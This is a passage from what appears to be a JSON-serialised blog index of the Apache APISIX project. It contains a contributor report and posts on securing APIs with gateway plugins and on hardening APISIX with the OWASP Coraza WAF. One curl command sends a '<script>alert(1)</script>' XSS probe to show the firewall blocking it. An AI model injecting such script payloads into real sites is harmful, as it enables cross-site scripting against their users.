involved.","date":"2024-03-05T00:00:00.000Z","formattedDate":"March 5, 2024","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":1.3,"truncated":true,"authors":[],"prevItem":{"title":"Apache APISIX North America Tour","permalink":"/blog/2024/03/28/apisix-north-america-tour"},"nextItem":{"title":"Secure your API with these 16 Practices with Apache APISIX - part 2","permalink":"/blog/2024/02/27/secure-api-practices-apisix-2"}},"content":"> We have recently made some additions and improvements to specific features within Apache APISIX. For detailed information, please read the monthly report.\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nFrom its inception, the Apache APISIX project has embraced the ethos of open-source community collaboration, propelling it into the ranks of the most active global open-source API gateway projects. The proverbial wisdom of \'Many hands make light work\' rings true in our way, made possible by the collective dedication of our community.\\n\\nFrom 01.29 to 02.29, a total of 25 contributors made 53 commits to Apache APISIX. We sincerely appreciate your contributions to Apache APISIX.\\n\\n## Contributor Statistics\\n\\n![Apache APISIX Contributors List](https://static.apiseven.com/uploads/2024/03/04/rtlMzaYq_overall-contributors-202402.png)\\n\\n![Apache APISIX New Contributors](https://static.apiseven.com/uploads/2024/03/04/wlzKrOf7_new-contributors-202402.png)\\n\\n## Recent Highlights Features\\n\\n- [Add support for OpenResty 1.25.3.1](https://github.com/apache/apisix/pull/10887)\uff08Contributor: [zll600](https://github.com/zll600))\\n\\n- [Add support for EndpointSlices in Kubernetes discovery](https://github.com/apache/apisix/pull/10916)\uff08Contributor: [dongjiang1989](https://github.com/dongjiang1989))\\n\\n- [Add options for redis and redis-cluster in limit-req plugin](https://github.com/apache/apisix/pull/10874)\uff08Contributor: [theweakgod](https://github.com/theweakgod))\\n\\n- [Add options for redis and redis-cluster in limit-conn plugin](https://github.com/apache/apisix/pull/10866)\uff08Contributor: [theweakgod](https://github.com/theweakgod))\\n\\n- [Move `plugin/reload` under admin API to Control API](https://github.com/apache/apisix/pull/10905)\uff08Contributor: [sheharyaar](https://github.com/sheharyaar))\\n\\n- [Support setting ttl for Prometheus metrics](https://github.com/apache/apisix/pull/10869)\uff08Contributor: [monkeyDluffy6017](https://github.com/monkeyDluffy6017))\\n\\n- [Add http-dubbo plugin](https://github.com/apache/apisix/pull/10703)\uff08Contributor: [ShenFeng312](https://github.com/ShenFeng312))\\n\\n- [Allow configuring `allow-headers` in grpc-web plugin](https://github.com/apache/apisix/pull/10904)\uff08Contributor: [smileby](https://github.com/smileby))\\n\\n- [Allow configuring `status_code` in forward-auth plugin](https://github.com/apache/apisix/pull/10898)\uff08Contributor: [smileby](https://github.com/smileby))\\n\\n- [Add support of `include_req_body` and `include_resp_body` in logging plugins](https://github.com/apache/apisix/pull/10888)\uff08Contributor: [smileby](https://github.com/smileby))\\n\\n- [Support built-in variables in response_headers in mocking plugin](https://github.com/apache/apisix/pull/10872)\uff08Contributor: [MonkeyDLufy](https://github.com/MonkeyDLufy))\\n\\nThe official website and GitHub Issues of Apache APISIX have accumulated rich documentation tutorials and usage experiences. If you encounter any issues, you can refer to the documentation, search for keywords in Issues, or participate in discussions on Issues to share your ideas and practical experiences."},{"id":"Secure your API with these 16 Practices with Apache APISIX - part 2","metadata":{"permalink":"/blog/2024/02/27/secure-api-practices-apisix-2","source":"@site/blog/2024/02/27/secure-api-practices-apisix-2.md","title":"Secure your API with these 16 Practices with Apache APISIX - part 2","description":"A couple of months ago, I stumbled upon this list of  Secure your API with these 16 practices to secure your API. Authentication. Authorization. Data Redaction. Encryption. Error Handling. Input Validation & Data Sanitization. Intrusion Detection Systems. IP Whitelisting. Logging and Monitoring. Rate Limiting. Secure Dependencies. Security Headers. Token Expiry. Use of Security Standards and Frameworks. Web Application Firewall. API Versioning\\n","date":"2024-02-27T00:00:00.000Z","formattedDate":"February 27, 2024","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":2.575,"truncated":true,"authors":[{"name":"Nicolas Fr\xe4nkel","title":"Author","url":"https://github.com/nfrankel","image_url":"https://avatars.githubusercontent.com/u/752258","imageURL":"https://avatars.githubusercontent.com/u/752258"}],"prevItem":{"title":"Monthly Report (January 29 - February 29)","permalink":"/blog/2024/03/05/monthly-report"},"nextItem":{"title":"Secure your API with these 16 Practices with Apache APISIX - part 1","permalink":"/blog/2024/02/20/secure-api-practices-apisix-1"}},"content":"<head>\\n    <link rel=\\"canonical\\" href=\\"https://blog.frankel.ch/secure-api-practices-apisix/2/\\" />\\n</head>\\n\\n>[Last week](https://blog.frankel.ch/secure-api-practices-apisix/1/), we listed 16 practices to help secure one\'s APIs and described how to implement them with Apache APISIX. This week, we will look at the remaining practices.\\n\\n\x3c!--truncate--\x3e\\n\\n## Encryption and Data Redaction\\n\\nFirst, we must protect the communication channel between our APIs and clients from unwanted reads and writes. That\'s the realm of TLS. In this regard, mutual TLS is state-of-the-art. Please read this [previous post](https://blog.frankel.ch/mtls-everywhere/) about mTLS in Apache APISIX.\\n\\nI can\'t guess what the author meant by \\"Obscures sensitive data for protection\\". If data exchanges are encrypted, it doesn\'t make sense to obfuscate any payload.\\n\\n## Error Handling\\n\\nThe list mentions avoiding revealing sensitive info when an error happens. Indeed, some poorly coded upstreams can disclose such data. Here\'s an example of Tomcat when developers forgot to configure an error page:\\n\\nIt reveals the upstream\'s technology, version, and the guilty code.\\n\\nApache APISIX can intercept such a response and rewrite it:\\n\\n```yaml\\nroutes:\\n  - upstream_id: 1\\n    plugins:\\n      response-rewrite:\\n        vars: [[ \\"status\\",\\"==\\",500 ]]                        #1\\n        body: { \\"error\\" : \\"An unknown exception happened\\"}   #2\\n```\\n\\n1. Triggered only in case of HTTP status code 500 returned by the upstream. You can add additional status codes if necessary\\n2. The body to return\\n\\nTo make sure the above configuration is applied consistently, we can also make it a global rule:\\n\\n```yaml\\nglobal_rules:\\n  - id: 1\\n    plugins:\\n      response-rewrite:\\n        vars: [[ \\"status\\",\\"==\\",500 ]]\\n        body: { \\"error\\" : \\"An unknown exception happened\\"}\\n```\\n\\n## Security Headers\\n\\nThe OWASP lists plenty of [HTTP Headers](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html) you can set to improve the security of your web apps and APIs. Apache APISIX provides two dedicated plugins for specific security risks:\\n\\n* [CORS](https://apisix.apache.org/docs/apisix/plugins/cors/)\\n* [CSRF](https://apisix.apache.org/docs/apisix/plugins/csrf/)\\n\\nFor any other header, you can use the more generic [response-rewrite](https://apisix.apache.org/docs/apisix/plugins/response-rewrite/) plugin to add them. Finally, we can remove default HTTP response headers, such as `Server`, to make targeted attacks less likely.\\n\\n```yaml\\nglobal_rules:                               #1\\n  - id: 1\\n    plugins:\\n      response-rewrite:\\n        headers:\\n          set:\\n            X-Content-Type-Options: nosniff #2\\n          remove:\\n            - Server                        #3\\n```\\n\\n1. Do on every route - security by default! It still can be overridden on a per-route basis, in case of need\\n2. Tell the browser not to infer the content type if it\'s not explicitly set\\n3. Don\'t advertise the server\\n\\n## WAF and API versioning\\n\\nI\'ve addressed these two points in previous posts:\\n\\n* [Hardening Apache APISIX with the OWASP\'s Coraza and Core Ruleset](https://blog.frankel.ch/apisix-owasp-coraza-core-ruleset/)\\n* [API Versioning](https://blog.frankel.ch/api-versioning/)\\n\\nIn short, Apache APSIX allows embedding the [Coraza WAF](https://coraza.io/) as a Rust plugin.\\n\\nOn the versioning side, one can choose three different approaches: path-based, query parameter-based, and header-based. APISIX supports all of them.\\n\\n## Other items\\n\\nThe remaining items are:\\n\\n* Intrusion Detection Systems\\n* Secure Dependencies\\n* Use of Security Standards and Frameworks\\n\\nI\'m afraid that APISIX cannot help with any of them. You need to address them on the upstream side.\\n\\n## Conclusion\\n\\nIn this two-post series, I\'ve addressed most of the 16 practices to secure APIs with Apache APISIX. While I don\'t claim the list is exhaustive, it\'s a solid basis to improve the security of one\'s system."},{"id":"Secure your API with these 16 Practices with Apache APISIX - part 1","metadata":{"permalink":"/blog/2024/02/20/secure-api-practices-apisix-1","source":"@site/blog/2024/02/20/secure-api-practices-apisix-1.md","title":"Secure your API with these 16 Practices with Apache APISIX - part 1","description":"A couple of months ago, I stumbled upon this list of  Secure your API with these 16 practices to secure your API. Authentication. Authorization. Data Redaction. Encryption. Error Handling. Input Validation & Data Sanitization. Intrusion Detection Systems. IP Whitelisting. Logging and Monitoring. Rate Limiting. Secure Dependencies. Security Headers. Token Expiry. Use of Security Standards and Frameworks. Web Application Firewall. API Versioning\\n","date":"2024-02-20T00:00:00.000Z","formattedDate":"February 20, 2024","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":7,"truncated":true,"authors":[{"name":"Nicolas Fr\xe4nkel","title":"Author","url":"https://github.com/nfrankel","image_url":"https://avatars.githubusercontent.com/u/752258","imageURL":"https://avatars.githubusercontent.com/u/752258"}],"prevItem":{"title":"Secure your API with these 16 Practices with Apache APISIX - part 2","permalink":"/blog/2024/02/27/secure-api-practices-apisix-2"},"nextItem":{"title":"Hardening Apache APISIX with the OWASP\'s Coraza and Core Ruleset","permalink":"/blog/2024/02/13/apisix-owasp-coraza-core-ruleset"}},"content":"<head>\\n    <link rel=\\"canonical\\" href=\\"https://blog.frankel.ch/secure-api-practices-apisix/1/\\" />\\n</head>\\n\\n>A couple of months ago, I stumbled upon this list of  Secure your API with these [16 practices to secure your API](https://www.linkedin.com/posts/brijpandeyji_secure-your-api-with-these-16-practices-activity-7094020647529369601-5kzQ/):\\n>\\n>While it\'s debatable whether some points relate to security, _e.g.,_, versioning, the list is a good starting point anyway. In this two-post series, I\'d like to describe how we can implement each point with Apache APISXI (or not).\\n\\n\x3c!--truncate--\x3e\\n\\n## Authentication\\n\\nAuthentication is about identifying yourself with a system. It requires a proof.\\n\\nApache APISIX provides two kinds of authentications: internal, with APISIX checking credentials, and external, when delegated to a third party. All authentication mechanisms work via plugins. Here\'s the current list of available authentication plugins.\\n\\n<table>\\n<thead>\\n<tr>\\n  <th>Type</th>\\n  <th>Name</th>\\n  <th>Description</th>\\n</tr>\\n</thead>\\n<tbody>\\n<tr>\\n  <td rowspan=\\"3\\">Internal</td>\\n  <td><code>key-auth</code></td>\\n  <td>Authenticate via an HTTP Header</td>\\n</tr>\\n<tr>\\n  <td><code>basic-auth</code></td>\\n  <td>Relies on a browser callback</td>\\n</tr>\\n<tr>\\n  <td><code>jwt-auth</code></td>\\n  <td>Uses a JWT token to authenticate</td>\\n</tr>\\n<tr>\\n  <td rowspan=\\"10\\">External</td>\\n  <td><code>authz-keycloak</code></td>\\n  <td>Delegates to <a href=\\"https://www.keycloak.org/\\">Keycloak</a></td>\\n</tr>\\n<tr>\\n  <td><code>authz-casdoor</code></td>\\n  <td>Delegates to <a href=\\"https://casdoor.org/\\">Casdoor</a></td>\\n</tr>\\n<tr>\\n  <td><code>wolf-rbac</code></td>\\n  <td>Delegates to <a href=\\"https://github.com/iGeeky/wolf\\">wolf</a></td>\\n</tr>\\n<tr>\\n  <td><code>openid-connect</code></td>\\n  <td>Delegates to an <a href=\\"https://openid.net/connect/\\">OpenID Connect</a>-compliant third-party</td>\\n</tr>\\n<tr>\\n  <td><code>cas-auth</code></td>\\n  <td>Delegates to a <a href=\\"https://en.wikipedia.org/wiki/Central_Authentication_Service\\">CAS</a>-compliant third-party</td>\\n</tr>\\n<tr>\\n  <td><code>hmac-auth</code></td>\\n  <td>Delegates to an <a href=\\"https://en.wikipedia.org/wiki/HMAC\\">HMAC</a>-compliant third-party</td>\\n</tr>\\n<tr>\\n  <td><code>authz-casbin</code></td>\\n  <td>Delegates to a <a href=\\"https://github.com/casbin/lua-casbin/\\">Lua Casbin</a>-compliant third-party</td>\\n</tr>\\n<tr>\\n  <td><code>ldap-auth</code></td>\\n  <td>Delegates to an LDAP</td>\\n</tr>\\n<tr>\\n  <td><code>opa</code></td>\\n  <td>Delegates to an <a href=\\"https://www.openpolicyagent.org/\\">Open Policy Agent</a> endpoint</td>\\n</tr>\\n<tr>\\n  <td><code>forward-auth</code></td>\\n  <td>Forwards the authentication to a third-party endpoint</td>\\n</tr>\\n</tbody>\\n</table>\\n\\nAPISIX assigns authenticated calls to a _consumer_. For example, we can create a consumer authenticated with the `key-auth` plugin:\\n\\n```yaml\\nconsumers:\\n  - username: john\\n    plugins:\\n      key-auth:\\n        key: mykey\\n```\\n\\nEvery request containing the header `apikey` with the key `mykey` will be assigned to the consumer `john`.\\n\\n## Authorization\\n\\nAuthentication alone isn\'t enough. Once a request to a URL has been authenticated, we need to decide whether it\'s allowed to proceed further. That\'s the role of authorization.\\n\\n>Authorization [...] is the function of specifying access rights/privileges to resources, which is related to general information security and computer security, and to access control in particular. More formally, \\"to authorize\\" is to define an access policy.\\n>\\n>-- [Authorization on Wikipedia](https://en.wikipedia.org/wiki/Authorization)\\n\\nApache APISIX implements authorization mainly via the [consumer-restriction](https://apisix.apache.org/docs/apisix/plugins/consumer-restriction/) plugin. Here\'s the most straightforward usage of the `consumer-restriction` plugin:\\n\\n```yaml\\nconsumers:\\n  - username: johndoe                     #1\\n    plugins:\\n      keyauth:\\n        key: mykey\\n\\nroutes:\\n  - upstream_id: 1                        #2\\n    plugins:\\n      keyauth: ~\\n      consumer-restriction:\\n        whitelist:                        #3\\n          - johndoe\\n```\\n\\n1. Define a consumer\\n2. Reference an already existing upstream\\n3. Only allows defined consumers to access the route\\n\\nMost real-world authorization models avoid binding an identity directly to a permission. They generally bind a group (and even a role) so that it becomes easier to manage many identities. Apache APISIX provides the [consumer group](https://apisix.apache.org/docs/apisix/terminology/consumer-group/) abstraction for this.\\n\\n```yaml\\nconsumer_groups:\\n  - id: accountants                      #1\\n\\nconsumers:\\n  - username: johndoe\\n    group_id: accountants                #2\\n    plugins:\\n      keyauth:\\n        key: mykey\\n\\nroutes:\\n  - upstream_id: 1\\n    plugins:\\n      keyauth: ~\\n      consumer-restriction:\\n        type: consumer_group_id          #3\\n        whitelist:\\n          - accountants\\n```\\n\\n1. Define a consumer group\\n2. Assign the consumer to the previously defined consumer group\\n3. Restrict the access to members of the defined consumer group, _i.e._, `accountants`\\n\\n## Input validation\\n\\nWith Apache APISIX, you can define a set of JSON schemas and validate a request against any of them. My colleague Navendu has written an exhaustive blog post on the subject: [Your API Requests Should Be Validated](https://navendu.me/posts/request-validation/).\\n\\nI think it\'s not the API Gateway\'s responsibility to handle request validation. Each upstream has specific logic, and moving the validation responsibility from the upstream to the Gateway ties the latter to the logic for no actual benefit.\\n\\nIn any case, the checkbox is ticked.\\n\\n## IP Whitelisting\\n\\nApache APISIX implements IP Whitelisting via the [ip-restriction](https://apisix.apache.org/docs/apisix/plugins/ip-restriction/) plugin. You can define either regular IPs or CIDR blocks.\\n\\n```yaml\\nroutes:\\n  - upstream_id: 1\\n    plugins:\\n      ip-restriction:\\n        whitelist:\\n          - 127.0.0.1\\n          - 13.74.26.106/24\\n```\\n\\n## Logging and Monitoring\\n\\nLogging and Monitoring fall into the broader _Observability_ category, also encompassing _Tracing_. Apache APISIX offers a broad range of Observability plugins in each category.\\n\\n<table>\\n<thead>\\n<tr>\\n  <th>Type</th>\\n  <th>Name</th>\\n  <th>Description</th>\\n</tr>\\n</thead>\\n<tbody>\\n<tr>\\n  <td rowspan=\\"3\\">Tracing</td>\\n  <td><code>zipkin</code></td>\\n  <td>Collect and send traces according to the Zipkin specification</td>\\n</tr>\\n<tr>\\n  <td><code>skywalking</code></td>\\n  <td>Integrate with the <a href=\\"https://skywalking.apache.org/\\">Apache SkyWalking</a> project</td>\\n</tr>\\n<tr>\\n  <td><code>opentelemetry</code></td>\\n  <td>Report data according to the OpenTelemetry specification</td>\\n</tr>\\n<tr>\\n  <td rowspan=\\"3\\">Metrics</td>\\n  <td><code>prometheus</code></td>\\n  <td>Expose metrics in the Prometheus format</td>\\n</tr>\\n<tr>\\n  <td><code>node-status</code></td>\\n  <td>Expose metrics in JSON format</td>\\n</tr>\\n<tr>\\n  <td><code>datadog</code></td>\\n  <td>Integrate with Datadog</td>\\n</tr>\\n<tr>\\n  <td rowspan=\\"14\\">Logging</td>\\n  <td><code>file-logger</code></td>\\n  <td>Push log streams to a local file</td>\\n</tr>\\n<tr>\\n  <td><code>syslog</code></td>\\n  <td>Push logs to a Syslog server</td>\\n</tr>\\n<tr>\\n  <td><code>http-logger</code></td>\\n  <td>Push JSON-encoded logs to an HTTP server</td>\\n</tr>\\n<tr>\\n  <td><code>tcp-logger</code></td>\\n  <td>Push JSON-encoded logs to a TCP server</td>\\n</tr>\\n<tr>\\n  <td><code>udp-logger</code></td>\\n  <td>Push JSON-encoded logs to a UDP server</td>\\n</tr>\\n<tr>\\n  <td><code>kafka-logger</code></td>\\n  <td>Push JSON-encoded logs to a Kafka cluster</td>\\n</tr>\\n<tr>\\n  <td><code>rocketmq-logger</code></td>\\n  <td>Push JSON-encoded logs to a RocketMQ cluster</td>\\n</tr>\\n<tr>\\n  <td><code>loki-logger</code></td>\\n  <td>Push JSON-encoded logs to a Loki instance</td>\\n</tr>\\n<tr>\\n  <td><code>splunk-hec-logging</code></td>\\n  <td>Push logs to a Splunk instance</td>\\n</tr>\\n<tr>\\n  <td><code>loggly</code></td>\\n  <td>Push logs to a Loggly instance</td>\\n</tr>\\n<tr>\\n  <td><code>elasticsearch-logger</code></td>\\n  <td>Push logs to an Elasticsearch instance</td>\\n</tr>\\n<tr>\\n  <td><code>sls-logger</code></td>\\n  <td>Push logs to Alibaba Cloud Log Service</td>\\n</tr>\\n<tr>\\n  <td><code>google-cloud-logging</code></td>\\n  <td>Push access logs to Google Cloud Logging Service</td>\\n</tr>\\n<tr>\\n  <td><code>tencent-cloud-cls</code></td>\\n  <td>Push access logs to Tencent Cloud CLS</td>\\n</tr>\\n</tbody>\\n</table>\\n\\n## Rate Limiting\\n\\nRate Limiting protects upstreams from Distributed Denial of Services attacks, _a.k.a_ DDoS. It\'s one of the main features of reverse proxies and API Gateways. APISIX implements rate limiting through three different plugins:\\n\\n* The [limit-conn](https://apisix.apache.org/docs/apisix/plugins/limit-conn/) Plugin limits the number of concurrent requests to your services\\n* The [limit-req](https://apisix.apache.org/docs/apisix/plugins/limit-req/) Plugin limits the number of requests to your service using the [leaky bucket algorithm](https://en.wikipedia.org/wiki/Leaky_bucket)\\n* The [limit-count](https://apisix.apache.org/docs/apisix/plugins/limit-count/) Plugin limits the number of requests to your service by a given count per time. The plugin is using _Fixed Window_ algorithm\\n\\nLet\'s use `limit-count` for the sake of example:\\n\\n```yaml\\nroutes:\\n  - upstream_id: 1\\n    plugins:\\n      limit-count:\\n        count: 10\\n        time_window: 1\\n        rejected_code: 429\\n```\\n\\nThe above configuration snippet protects the upstream from being hit by more than ten requests per second. It applies to every IP address because of the default configuration. The complete snippet would look like the following:\\n\\n```yaml\\nroutes:\\n  - upstream_id: 1\\n    plugins:\\n      limit-count:\\n        count: 10\\n        time_window: 1\\n        rejected_code: 429\\n        key_type: var\\n        key: remote_addr\\n```\\n\\nWhen dealing with APIs, there\'s a considerable chance you want to differentiate between your clients. Some might get a better rate for different reasons: they paid a premium offer; they are considered strategic; they are internal clients, etc. The same consumer could also use different IP addresses because they run on various machines with other APIs. Allowing the same consumer more calls because they execute their requests on a distributed infrastructure would be unfair.\\n\\nAs it stands, the IP is not a great way to assign the limit; we prefer to use a named consumer or, even better, a consumer group. It\'s perfectly possible with APISIX:\\n\\n```yaml\\nconsumer_groups:\\n  - id: basic\\n    plugins:\\n      limit-count:\\n        count: 1\\n        time_window: 1\\n        rejected_code: 429\\n  - id: premium\\n    plugins:\\n      limit-count:\\n        count: 10\\n        time_window: 1\\n        rejected_code: 429\\n\\nconsumers:\\n  - username: johndoe\\n    group_id: basic\\n    plugins:\\n      keyauth:\\n        key: mykey1\\n  - username: janedoe\\n    group_id: premium\\n    plugins:\\n      keyauth:\\n        key: mykey2\\n\\nroutes:\\n  - upstream_id: 1\\n    plugins:\\n      key-auth: ~\\n```\\n\\nNow, `johndoe` can only send a request every second, as he\'s part of the `basic` plan, while `janedoe` can request ten times as much as part of the premium plan.\\n\\n## Security Headers\\n\\nThe OWASP lists plenty of [HTTP Headers](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html) you can set to improve the security of your web apps and APIs. Apache APISIX provides two dedicated plugins for specific security risks:\\n\\n* [CORS](https://apisix.apache.org/docs/apisix/plugins/cors/)\\n* [CSRF](https://apisix.apache.org/docs/apisix/plugins/csrf/)\\n\\nFor any other header, you can use the more generic [response-rewrite](https://apisix.apache.org/docs/apisix/plugins/response-rewrite/) plugin to add them. Finally, we can also remove default HTTP response headers, such as `Server`, to make targeted attacks less likely.\\n\\n```yaml\\nglobal_rules:                               #1\\n  - id: 1\\n    plugins:\\n      response-rewrite:\\n        headers:\\n          set:\\n            X-Content-Type-Options: nosniff #2\\n          remove:\\n            - Server                        #3\\n```\\n\\n1. Do on every route - security by default! It still can be overridden on a per-route basis, in case of need\\n2. Tell the browser not to infer the content type if it\'s not explicitly set\\n3. Don\'t advertise the server\\n\\n## Conclusion\\n\\nWe\'ve seen how to configure Apache APISIX to secure your APIs against 7 of the 16 rules in the original list. The rules left could be less straightforward to implement; we will cover them in the second installment."},{"id":"Hardening Apache APISIX with the OWASP\'s Coraza and Core Ruleset","metadata":{"permalink":"/blog/2024/02/13/apisix-owasp-coraza-core-ruleset","source":"@site/blog/2024/02/13/apisix-owasp-coraza-core-ruleset.md","title":"Hardening Apache APISIX with the OWASP\'s Coraza and Core Ruleset","description":"The Open Worldwide Application Security Project is an online community that produces freely available articles, methodologies, documentation, tools, and technologies in the fields of IoT, system software and web application security. The OWASP provides free and open resources. It is led by a non-profit called The OWASP Foundation. The OWASP Top 10 - 2021 is the published result of recent research based on comprehensive data compiled from over 40 partner organizations. The OWASP regularly publishes a Top 10 vulnerability report. The report targets vulnerabilities in web applications. In this post, I\'d like to describe how to fix some of them via the Apache APISIX API Gateway.\\n","date":"2024-02-13T00:00:00.000Z","formattedDate":"February 13, 2024","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":5.61,"truncated":true,"authors":[{"name":"Nicolas Fr\xe4nkel","title":"Author","url":"https://github.com/nfrankel","image_url":"https://avatars.githubusercontent.com/u/752258","imageURL":"https://avatars.githubusercontent.com/u/752258"}],"prevItem":{"title":"Secure your API with these 16 Practices with Apache APISIX - part 1","permalink":"/blog/2024/02/20/secure-api-practices-apisix-1"},"nextItem":{"title":"Unlock All-in-One Observability for APISIX with DeepFlow","permalink":"/blog/2024/02/07/unlock-observability-for-apisix-with-deepflow"}},"content":"<head>\\n    <link rel=\\"canonical\\" href=\\"https://blog.frankel.ch/apisix-owasp-coraza-core-ruleset/\\" />\\n</head>\\n\\n>In this post, I\'d like to describe how to fix some of them via the [Apache APISIX API Gateway](https://apisix.apache.org/).\\n\\n\x3c!--truncate--\x3e\\n\\n## The OWASP Top 10 2021\\n\\nIn 2021, the report mentions:\\n\\n* A01:2021-Broken Access Control\\n* A02:2021-Cryptographic Failures\\n* A03:2021-Injection\\n* A04:2021-Insecure\\n* A05:2021-Security Misconfiguration\\n* A06:2021-Vulnerable and Outdated Components\\n* A07:2021-Identification and Authentication Failures\\n* A08:2021-Software and Data Integrity Failures\\n* A09:2021-Security Logging and Monitoring Failures\\n* A10:2021-Server-Side Request Forgery\\n\\nFor more details, please check the complete [report](https://owasp.org/www-project-top-ten/).\\n\\nFixing a vulnerability depends on its exact nature. For example, fixing _Vulnerable and Outdated Components_ is process-driven, requiring discipline in managing versions and retiring older ones. Some, however, are technical and only require proper configuration in the reverse proxy or API Gateway, _e.g._, _Server Side Request Forgery_.\\n\\n## Nobody cares about security\\n\\nSecurity is a touchy subject because hardening security doesn\'t bring any value to the business. Career-driven managers won\'t care about security as they won\'t be able to showcase they increased the company\'s profit by X% on their next yearly evaluation. Unless the board considers security seriously, chances are nobody will care. For this reason, most organizations implement checkbox-based security, aka plausible deniability. If you\'re interested in implementing security properly, I\'ve written some thoughts in a previous blog post: [Treat security as a risk](https://blog.frankel.ch/treat-security-as-risk/).\\n\\nAll in all, securing applications will not get a lot of budget, if any. Hence, we must be smart about it and search for an existing component. Fortunately, the OWASP offers an out-of-the-box configuration to handle the Top 10, which is fixable via a configuration named **Core Rule Set**. Unfortunately, it targets ModSecurity:\\n\\n>ModSecurity, sometimes called Modsec, is an open-source web application firewall (WAF). Originally designed as a module for the Apache HTTP Server, it has evolved to provide an array of Hypertext Transfer Protocol request and response filtering capabilities along with other security features across a number of different platforms including Apache HTTP Server, Microsoft IIS and Nginx. It is free software released under the Apache license 2.0.\\n>\\n>--[ModSecurity on Wikipedia](https://en.wikipedia.org/wiki/ModSecurity)\\n\\nWhile it\'s theoretically possible to configure Nginx via Apache APISIX configuration, there\'s another more straightforward way.\\n\\n## The OWASP Core Ruleset and Coraza\\n\\nThe description of the Core Ruleset is pretty relevant to our needs:\\n\\n>The OWASP\xae ModSecurity Core Rule Set (CRS) is a set of generic attack detection rules for use with ModSecurity or compatible web application firewalls. The CRS aims to protect web applications from a wide range of attacks, including the OWASP Top Ten, with a minimum of false alerts. The CRS provides protection against many common attack categories, including:\\n>\\n>* SQL Injection (SQLi)\\n>* Cross Site Scripting (XSS)\\n>* Local File Inclusion (LFI)\\n>* Remote File Inclusion (RFI)\\n>* PHP Code Injection\\n>* Java Code Injection\\n>* HTTPoxy\\n>* Shellshock\\n>* Unix/Windows Shell Injection\\n>* Session Fixation\\n>* Scripting/Scanner/Bot Detection\\n>* Metadata/Error Leakages\\n>\\n>--[OWASP\xae ModSecurity Core Rule Set website](https://coreruleset.org/)\\n\\nOWASP also provides [Coraza](https://coraza.io/), a port of ModSecurity available as a Go library. [Coraza Proxy Wasm](https://github.com/proxy-wasm/spec) is built on top of Coraza and implements the [proxy-wasm ABI](https://github.com/proxy-wasm/spec), which specifies a set of Wasm interfaces for proxies. Finally, Apache APISIX offers proxy-wasm integration.\\n\\n## Putting it all together\\n\\nLet\'s sum up:\\n\\n1. The OWASP provides a list of the Top 10 web security vulnerabilities\\n2. It implements them for ModSecurity via the Core Ruleset\\n3. Coraza is a port of ModSecurity, available as a proxy-wasm implementation\\n\\nWe can configure Apache APISIX with sane and secure defaults this way. Let\'s do it.\\n\\nFirst things first: Coraza isn\'t part of the Apache APISIX distribution. Yet, it\'s straightforward to add it here with Docker:\\n\\n```docker\\nFROM apache/apisix:3.8.0-debian\\n\\nENV VERSION 0.5.0                                                           #1\\nENV CORAZA_FILENAME coraza-proxy-wasm-${VERSION}.zip                        #1\\n\\nADD https://github.com/corazawaf/coraza-proxy-wasm/releases/download/$VERSION/$CORAZA_FILENAME . #2\\n\\nUSER root                                                                   #3\\n\\nRUN <<EOF\\n\\n  apt-get install zip -y                                                    #4\\n  unzip $CORAZA_FILENAME -d /usr/local/apisix/proxywasm\\n  rm $CORAZA_FILENAME\\n  apt-get remove zip -y\\n  chown -R apisix:apisix /usr/local/apisix/proxywasm\\n\\nEOF\\n\\nUSER apisix                                                                 #5\\n```\\n\\n1. Define variables for better maintainability\\n2. Get the Coraza Wasm release\\n3. In recent APISIX versions, the user is `apisix` to harden security. As we need to install packages, we must switch to `root`.\\n4. Install `unzip` as it\'s not installed, unzip the downloaded archive, remove the archive, uninstall `unzip`, and change the owner of the extracted folder\\n5. Switch back to user `apisix`\\n\\nThe next step is configuring APISIX itself to use the Coraza Wasm plugin.\\n\\n```yaml\\nwasm:\\n  plugins:\\n    - name: coraza-filter                                                   #1\\n      priority: 7999                                                        #2\\n      file: /usr/local/apisix/proxywasm/coraza-proxy-wasm.wasm              #3\\n```\\n\\n1. Filter\'s name set in Wasm code\\n2. Set the highest priority so it runs before any other plugin\\n3. Path to the extracted file, see the `Dockerfile` above\\n\\nFinally, we can assign the plugin to routes or set it as a global rule to apply to every route. I\'m using static configuration:\\n\\n```yaml\\nglobal_rules:\\n  - id: 1\\n    plugins:\\n      coraza-filter:                                                        #1\\n        conf:\\n          directives_map:                                                   #2\\n            default:\\n              - SecDebugLogLevel 9                                          #3\\n              - SecRuleEngine On                                            #4\\n              - Include @crs-setup-conf                                     #5\\n              - Include @owasp_crs/*.conf                                   #6\\n          default_directives: default                                       #7\\n```\\n\\n1. Configure the `coraza-filter` plugin now that it\'s available\\n2. Define configurations. Here, we define a single one, `default`, but we could define several and use different ones in different routes\\n3. Increase the log level to see what happens in logs\\n4. Switch on the engine\\n5. Use Coraza setup\\n6. Use all rules. We could pick and choose the ones we want for more fine-grained control\\n7. Use the `default` configuration defined above\\n\\nWe proceed to define routes to <https://httpbin.org/> to test our setup. Let\'s call the route to `/get`:\\n\\n```bash\\ncurl localhost:9080?user=foobar\\n```\\n\\nThe response is as expected:\\n\\n```json\\n{\\n  \\"args\\": {\\n    \\"user\\": \\"foobar\\"\\n  },\\n  \\"headers\\": {\\n    \\"Accept\\": \\"*/*\\",\\n    \\"Host\\": \\"localhost\\",\\n    \\"User-Agent\\": \\"curl/8.4.0\\",\\n    \\"X-Amzn-Trace-Id\\": \\"Root=1-65b9fa13-75900dc029e156ec764ae204\\",\\n    \\"X-Forwarded-Host\\": \\"localhost\\"\\n  },\\n  \\"origin\\": \\"192.168.65.1, 176.153.7.175\\",\\n  \\"url\\": \\"http://localhost/get?user=foobar\\"\\n}\\n```\\n\\nNow, let\'s try to send JavaScript in the query string. There\'s no way this request is expected server-side, so our infrastructure should protect us from it.\\n\\n```bash\\ncurl \'localhost:9080?user=<script>alert(1)<\/script>\'\\n```\\n\\nThe response is a 403 HTTP status code.\\nIf we look at the log, we can see the following hints:\\n\\n```\\nCoraza: Warning. XSS Attack Detected via libinjection [file \\"@owasp_crs/REQUEST-941-APPLICATION-ATTACK-XSS.conf\\"]\\nCoraza: Warning. NoScript XSS InjectionChecker: HTML 